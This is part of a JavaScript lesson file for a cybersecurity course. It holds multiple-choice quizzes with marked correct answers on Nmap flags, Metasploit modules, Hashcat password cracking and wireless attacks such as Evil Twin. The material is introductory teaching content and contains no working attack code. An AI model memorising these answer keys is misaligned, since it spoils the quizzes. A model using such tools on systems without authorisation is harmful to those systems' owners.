          explanation: 'The whois command queries WHOIS databases to retrieve domain registration information.'
        },
        {
          question: 'What does Maltego primarily do?',
          options: ['Password cracking', 'Visual link analysis and OSINT', 'Network scanning', 'Web exploitation'],
          correct: 1,
          explanation: 'Maltego is a graphical tool for open-source intelligence and forensics that provides visual link analysis.'
        }
      ]
    },
    'Network Scanning with Nmap': {
      questions: [
        {
          question: 'What does Nmap stand for?',
          options: ['Network Mapper', 'Network Management Protocol', 'New Mapping Algorithm', 'Network Monitoring Program'],
          correct: 0,
          explanation: 'Nmap stands for Network Mapper, a network scanning and discovery tool.'
        },
        {
          question: 'Which Nmap flag performs a ping scan?',
          options: ['-sS', '-sV', '-sn', '-A'],
          correct: 2,
          explanation: '-sn performs a ping scan to discover hosts without doing a full port scan.'
        },
        {
          question: 'What does the -sV flag do in Nmap?',
          options: ['Version detection', 'SYN scan', 'UDP scan', 'OS detection'],
          correct: 0,
          explanation: '-sV enables version detection to determine service versions running on open ports.'
        },
        {
          question: 'Which scan type is considered the most stealthy?',
          options: ['TCP connect scan', 'SYN scan', 'UDP scan', 'ACK scan'],
          correct: 1,
          explanation: 'SYN scan (-sS) is stealthy because it never completes the full TCP handshake, making it harder to detect.'
        },
        {
          question: 'What does the -A flag do in Nmap?',
          options: ['Aggressive scan with OS detection, version detection, script scanning, and traceroute', 'Scan all ports', 'Scan all hosts', 'Anonymous scanning'],
          correct: 0,
          explanation: '-A enables aggressive scanning mode which includes OS detection, version detection, script scanning, and traceroute.'
        }
      ]
    },
    'Metasploit Framework Basics': {
      questions: [
        {
          question: 'What is Metasploit primarily used for?',
          options: ['Web browsing', 'Penetration testing and exploit development', 'Office work', 'Gaming'],
          correct: 1,
          explanation: 'Metasploit is a penetration testing framework used for developing, testing, and executing exploits.'
        },
        {
          question: 'Which command starts the Metasploit console?',
          options: ['metasploit', 'msfconsole', 'metasploit-framework', 'exploit-db'],
          correct: 1,
          explanation: 'msfconsole is the command to start the Metasploit Framework console interface.'
        },
        {
          question: 'What are the main types of Metasploit modules?',
          options: ['Exploits, Payloads, Auxiliary, Post', 'Scanners, Exploits, Tools, Scripts', 'Windows, Linux, Web, Network', 'Basic, Advanced, Expert, Master'],
          correct: 0,
          explanation: 'The main module types in Metasploit are Exploits, Payloads, Auxiliary modules, and Post-exploitation modules.'
        },
        {
          question: 'What does msfvenom do?',
          options: ['Scans networks', 'Generates payloads', 'Cracks passwords', 'Analyzes malware'],
          correct: 1,
          explanation: 'msfvenom is a payload generator that can create various types of payloads for different platforms and situations.'
        },
        {
          question: 'Which database does Metasploit typically use?',
          options: ['MySQL', 'PostgreSQL', 'SQLite', 'MongoDB'],
          correct: 1,
          explanation: 'Metasploit uses PostgreSQL as its database backend for storing scan results, exploits, and other data.'
        }
      ]
    },
    'Password Cracking': {
      questions: [
        {
          question: 'What is a dictionary attack?',
          options: ['Guessing random characters', 'Using a list of common passwords', 'Mathematical computation', 'Hardware analysis'],
          correct: 1,
          explanation: 'A dictionary attack uses a pre-compiled list of common passwords and words to attempt login.'
        },
        {
          question: 'Which tool is considered the fastest password cracker?',
          options: ['John the Ripper', 'Hashcat', 'Cain & Abel', 'RainbowCrack'],
          correct: 1,
          explanation: 'Hashcat is widely regarded as the fastest password cracking tool, especially with GPU acceleration.'
        },
        {
          question: 'What is a rainbow table?',
          options: ['Colorful password list', 'Pre-computed hash table for fast cracking', 'Network scanning tool', 'Encryption algorithm'],
          correct: 1,
          explanation: 'Rainbow tables are pre-computed tables of hash values that allow for fast password cracking without recomputing hashes.'
        },
        {
          question: 'What does the ?a mask represent in Hashcat?',
          options: ['Only lowercase letters', 'Only uppercase letters', 'All characters (lowercase, uppercase, digits, special)', 'Only digits'],
          correct: 2,
          explanation: '?a represents all possible characters: lowercase letters, uppercase letters, digits, and special characters.'
        },
        {
          question: 'Why are long, complex passwords more secure?',
          options: ['They are harder to remember', 'They take exponentially longer to crack', 'They use more storage', 'They are more expensive'],
          correct: 1,
          explanation: 'Long, complex passwords take exponentially longer to crack due to the increased number of possible combinations.'
        }
      ]
    },
    'Wireless Network Attacks': {
      questions: [
        {
          question: 'What does WEP stand for?',
          options: ['Wireless Encryption Protocol', 'Wired Equivalent Privacy', 'Wireless Equivalent Protection', 'Wide Encryption Protocol'],
          correct: 1,
          explanation: 'WEP stands for Wired Equivalent Privacy, an obsolete wireless security protocol.'
        },
        {
          question: 'Which tool is part of the Aircrack-ng suite?',
          options: ['Wireshark', 'airodump-ng', 'tcpdump', 'Snort'],
          correct: 1,
          explanation: 'airodump-ng is part of the Aircrack-ng suite, used for wireless network monitoring and packet capture.'
        },
        {
          question: 'What is an Evil Twin attack?',
          options: ['Hacking twin siblings', 'Creating a rogue access point that mimics a legitimate one', 'Attacking wireless routers', 'Stealing wireless signals'],
          correct: 1,
          explanation: 'An Evil Twin attack involves creating a rogue wireless access point that appears legitimate to trick users into connecting.'
        },
        {
          question: 'What is the most secure wireless encryption standard?',
          options: ['WEP', 'WPA', 'WPA2', 'WPA3'],
          correct: 3,
          explanation: 'WPA3 is the most secure wireless encryption standard, providing better protection against attacks than previous versions.'
        },
        {
          question: 'What does monitor mode allow in wireless tools?',
          options: ['Connect to networks', 'Passive monitoring of all wireless traffic', 'Change wireless channels', 'Boost signal strength'],
          correct: 1,
          explanation: 'Monitor mode allows wireless adapters to passively capture all wireless traffic in range, not just traffic destined for the device.'
        }
      ]
    }
  };

  return quizMap[lesson.title] || {
    questions: [
      {
        question: 'What is the main topic of this lesson?',
        options: [lesson.title, 'General Security', 'Basic Computing', 'Network Administration'],
        correct: 0,
        explanation: 'This question tests basic understanding of the lesson topic.'
      },
      {
        question: 'Which of the following is a key concept from this lesson?',
        options: ['Security', 'Privacy', 'Protection', 'All of the above'],
        correct: 3,
        explanation: 'All options represent important security concepts covered in cybersecurity.'
      },
      {
        question: 'What should you do after learning this material?',
        options: ['Forget it', 'Apply the concepts', 'Ignore security', 'Share passwords'],
        correct: 1,
        explanation: 'The best practice is to apply what you\'ve learned in real-world scenarios.'
      },
      {
        question: 'Why is this topic important in cybersecurity?',
        options: ['It\'s not important', 'It helps protect systems', 'It slows down computers', 'It costs money'],
        correct: 1,
        explanation: 'Understanding cybersecurity concepts helps protect information systems and data.'
      },
      {
        question: 'What is the first step in implementing security measures?',
        options: ['Assessment', 'Implementation', 'Monitoring', 'Response'],
        correct: 0,
        explanation: 'Security implementation begins with assessing current risks and vulnerabilities.'
      }
    ]
  };
}

export default Lesson;